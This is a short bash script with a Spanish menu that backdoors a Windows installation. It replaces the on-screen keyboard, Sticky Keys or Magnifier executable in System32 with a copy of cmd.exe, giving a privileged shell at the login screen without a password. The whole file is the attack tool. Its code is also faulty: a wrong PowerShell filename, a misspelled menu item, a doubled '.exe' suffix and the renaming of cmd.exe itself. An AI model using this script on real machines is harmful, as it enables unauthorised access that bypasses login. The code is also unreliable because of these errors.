#! /usr/bin/env bash
# -*- coding: utf-8 -*-

clear
echo " *** Hackear Windows Cambiar * por el CMD/PowerShell *** "
echo " SELECCIONA UNA OPCION: "
echo " 1.-Command prompt (cmd.exe)"
echo " 2.-PowerShell (powershell.exe)"
echo " 0.-Salir"
echo " "
read -p "OPCIÓN: " OPCION0
echo " "
echo " SELECCIONA UNA OPCION:"
echo " 1.-Hackear por ost.exe (Teclado Virtual)"
echo " 2.-Hackear por sethc.exe (Teclas Especiales)"
echo " 3.-Hackear por magnify.exe (Lupa)"
echo " 0.-Salir"
echo " "
read -p "OPCIÓN: " OPCION1
echo " "
read -p "Ruta Windows: " RUTA



case $OPCION0 in
	0)	exit;;
	1) CONSOLA="cmd.exe";;
	2) CONSOLA=".exe";;
	3)	;;
	*) echo "Error: Opcion no valida. Saliendo"; exit 1 ;;
	:) echo "Error: Está faltando un argumento en alguna parte. Saliendo"; exit 1 ;;
	?) echo "Error: Indicador no válido en alguna parte. Saliendo"; exit 1 ;;
esac
case $OPCION1 in
	0)	exit;;
	1)	ATAJO="osk.exe";;
	2)	ATAJO="sethc.exe";;
	3)	ATAJO="magnify.exe";;
	*) echo "Error: Opcion no valida. Saliendo"; exit 1 ;;
	:) echo "Error: Está faltando un argumento en alguna parte. Saliendo"; exit 1 ;;
	?) echo "Error: Indicador no válido en alguna parte. Saliendo"; exit 1 ;;
esac

cd $RUTA
mv ./Windows/System32/$CONSOLA ./Windows/System32/$CONSOLA.bak
mv ./Windows/System32/$ATAJO ./Windows/System32/$ATAJO.bak
cp ./Windows/System32/$CONSOLA.bak ./Windows/System32/$ATAJO.exe

exit 0
